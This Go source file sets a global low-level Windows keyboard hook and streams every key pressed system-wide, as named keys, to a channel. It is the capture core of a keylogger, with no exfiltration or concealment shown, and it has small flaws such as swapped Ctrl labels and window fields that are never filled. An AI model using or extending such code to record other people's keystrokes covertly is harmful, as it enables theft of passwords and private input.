package main

import (
	"fmt"
	"github.com/duanhunyiye/keyboard/listener/win32"
	"time"
	"unsafe"
)

var keyMap = map[win32.DWORD]string{
	8: "Backspace", 9: "Tab", 13: "Enter", 20: "CapsLock", 27: "Esc",

	32: "Space", 33: "PageUp", 34: "PageDown", 35: "End", 36: "Home", 37: "Left", 38: "Up", 39: "Right",
	40: "Down", 45: "Insert", 46: "Delete",

	48: "0", 49: "1", 50: "2", 51: "3", 52: "4", 53: "5", 54: "6", 55: "7", 56: "8", 57: "9",

	65: "a", 66: "b", 67: "c", 68: "d", 69: "e", 70: "f", 71: "g", 72: "h", 73: "i", 74: "j",
	75: "k", 76: "l", 77: "m", 78: "n", 79: "o", 80: "p", 81: "q", 82: "r", 83: "s", 84: "t",
	85: "u", 86: "v", 87: "w", 88: "x", 89: "y", 90: "z",

	91: "Win(left)", 92: "Win(right)",
	96: "0", 97: "1", 98: "2", 99: "3", 100: "4", 101: "5", 102: "6", 103: "7", 104: "8", 105: "9",
	106: "*", 107: "+", 109: "-", 110: ".", 111: "/",

	112: "F1", 113: "F2", 114: "F3", 115: "F4", 116: "F5", 117: "F6", 118: "F7", 119: "F8",
	120: "F9", 121: "F10", 122: "F11", 123: "F12",

	144: "NumLock", 160: "Shift(left)", 161: "Shift(right)", 162: "Ctrl(right)", 163: "Ctrl(left)",
	164: "Alt(left)", 165: "Alt(right)",

	186: ";", 187: "=", 188: ",", 189: "-", 190: ".", 191: "/", 192: "`",
	219: "[", 220: "\\", 221: "]", 222: "'",
}
var kbHook win32.HHOOK

type KBEvent struct {
	VkCode      win32.DWORD
	ProcessId   uint32
	ProcessName string
	WindowText  string
	Time        time.Time
}

var (
	windowText    string
	processId     uint32
	processName   string
	kbEventChanel = make(chan KBEvent, 200)
)

func KeyBordHook(KeyBordString chan string) {
	kbHook, err := win32.SetWindowsHookEx(win32.WH_KEYBOARD_LL, keyboardCallBack, 0, 0)
	if err != nil {
		panic(err)
	} else {
		fmt.Println("已设置键盘Hook")
	}
	defer func(hhk win32.HHOOK) {
		_, err := win32.UnhookWindowsHookEx(hhk)
		if err != nil {

		}
	}(kbHook)
	go fakekeydump(KeyBordString)
	win32.GetMessage(new(win32.MSG), 0, 0, 0)
}

func keyboardCallBack(nCode int, wParam win32.WPARAM, lParam win32.LPARAM) win32.LRESULT {
	if int(wParam) == win32.WM_KEYDOWN { //down
		kbd := (*win32.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		kbEventChanel <- KBEvent{
			VkCode:      kbd.VkCode,
			WindowText:  windowText,
			ProcessName: processName,
			ProcessId:   processId,
			Time:        time.Now(),
		}
	}
	res, _ := win32.CallNextHookEx(kbHook, nCode, wParam, lParam)
	return res
}

func fakekeydump(KeyBordString chan string) {
	for {
		event := <-kbEventChanel
		vkCode := event.VkCode
		KeyBordString <- keyMap[vkCode]
	}
}
